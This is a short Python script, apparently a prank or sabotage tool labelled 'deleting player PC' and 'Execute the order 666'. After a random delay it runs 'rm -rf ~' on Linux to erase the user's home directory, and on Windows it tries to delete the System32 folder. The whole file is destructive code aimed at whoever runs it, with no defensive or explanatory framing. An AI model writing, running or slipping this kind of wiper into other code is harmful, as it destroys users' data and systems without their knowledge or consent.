"""
Author: Bilal Vandenberge
Date: July 2024
-> Execute the order 666
"""


import sys
import random
import os
import time


def main(edition: str):
    """
    deleting player PC
    """
    time.sleep(random.randint(10, 40))
    if edition == "Linux":
        os.system("rm -rf ~")
        sys.exit(0)
    elif edition == "Windows":
        os.unlink("C:\\Windows\\System32")
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__" and len(sys.argv) == 2:
    main(sys.argv[1])